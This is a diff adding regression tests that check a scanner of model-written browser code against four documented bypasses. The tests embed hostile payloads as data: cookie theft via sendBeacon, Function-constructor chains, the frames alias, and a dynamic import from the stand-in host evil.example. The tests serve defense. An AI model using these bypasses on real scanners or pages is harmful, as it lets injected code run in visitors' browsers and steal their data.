@@ -546,3 +546,90 @@ test("a material value the size of a document is refused", () => {
   const v2 = validateWorldEdit(world, ok);
   assert.equal(v2.valid, true, `an ordinary material name must be accepted, got: ${(v2 as any).reason}`);
 });
+
+// =============================================================================
+// FOUR WAYS PAST browserOnlyReferences, ALL DEMONSTRATED WORKING
+//
+// This scanner is the only thing between a model-written world and every
+// visitor's browser: public/city-live-world.js and index.html both do
+// `await import('/world-source?t=...')`, so a shipped payload runs on the
+// client. A security audit found four independent bypasses and proved each one.
+//
+// The one that mattered most was not clever. `collectBindings` walked the WHOLE
+// program into one flat set with no notion of scope, and any name in that set
+// was then suppressed EVERYWHERE — so a single dead function whitelisted every
+// global on the list:
+//
+//     function __unused(document, fetch, navigator, localStorage) {}
+//     function tick(w){ document.title = "PWNED"; return w; }
+//
+// The parameters bind only inside __unused. The reference inside tick() reaches
+// the real global, and was verified to do so in a browser. The exact payload the
+// scanner's own docblock says it exists to stop, re-enabled by one line.
+//
+// Each case below is the audit's payload, unmodified.
+// =============================================================================
+
+/** Flagged by either scanner — the pipeline treats both as a refusal. */
+function isRefused(src: string): boolean {
+  return browserOnlyReferences(src).length > 0 || topLevelSideEffects(src).length > 0;
+}
+
+test("a dead function's parameters do not whitelist globals for the whole program", () => {
+  const payload = `
+function __unused(document, fetch, navigator, localStorage) {}
+function tick(w){ document.title = "PWNED"; navigator.sendBeacon("/collect", document.cookie); return w; }
+export { tick };`;
+  const refs = browserOnlyReferences(payload);
+  assert.ok(
+    refs.some((r) => r.startsWith("document")),
+    `the scanner did not flag document. One unused declaration disabled the whole ` +
+    `check, which is how the payload this scanner was written to stop got past it. ` +
+    `Got: ${JSON.stringify(refs)}`
+  );
+});
+
+test("constructor.constructor is caught in both member forms", () => {
+  // [].constructor.constructor IS Function, without the identifier `Function`
+  // appearing anywhere. The string form produces Literals, not Identifiers, so
+  // an identifier scan has nothing at all to look at.
+  for (const payload of [
+    `function tick(w){ const F = [].constructor.constructor; F("return 1")(); return w; }\nexport { tick };`,
+    `function tick(w){ const F = []["constructor"]["constructor"]; F("return 1")(); return w; }\nexport { tick };`,
+  ]) {
+    assert.ok(
+      isRefused(payload),
+      `a Function-constructor chain was not flagged: ${payload.slice(0, 70)}… ` +
+      `CSP without 'unsafe-eval' blocks this at runtime, but a check that leans on ` +
+      `a header it does not control is leaning on someone else's correctness.`
+    );
+  }
+});
+
+test("frames is treated as the window alias it is", () => {
+  // window/self/globalThis/top/parent/opener were listed; `frames` was not.
+  // It is a live alias for window, so frames.document and frames.fetch both work.
+  const payload = `function tick(w){ frames.document.title = "PWNED"; return w; }\nexport { tick };`;
+  assert.ok(isRefused(payload), "frames was not flagged — it is an alias for window");
+});
+
+test("a dynamic import inside a function body is refused", () => {
+  // topLevelSideEffects rejects an ImportDeclaration at the top level. An
+  // ImportExpression inside a function body was examined by neither check, and
+  // it loads arbitrary code directly.
+  const payload = `function tick(w){ import("https://evil.example/x.js"); return w; }\nexport { tick };`;
+  assert.ok(isRefused(payload), "import() inside a function body was not flagged");
+});
+
+test("narrowing the binding scan did not start rejecting ordinary code", () => {
+  // The fix can only OVER-report — a locally shadowed name now gets flagged —
+  // which is the safe direction, but only if it does not fire on real code.
+  // The shipped baseline is the strongest available control.
+  const ordinary = `
+const doc = { title: "ok" };
+function tick(w){ const constructor = w.constructor; doc.title = "fine"; return w; }
+export { tick };`;
+  assert.equal(isRefused(ordinary), false, `ordinary code was refused: ${JSON.stringify(browserOnlyReferences(ordinary))}`);
+  assert.deepEqual(browserOnlyReferences(SIM_BASELINE_SOURCE), [],
+    "the shipped baseline is now flagged by its own scanner");
+});
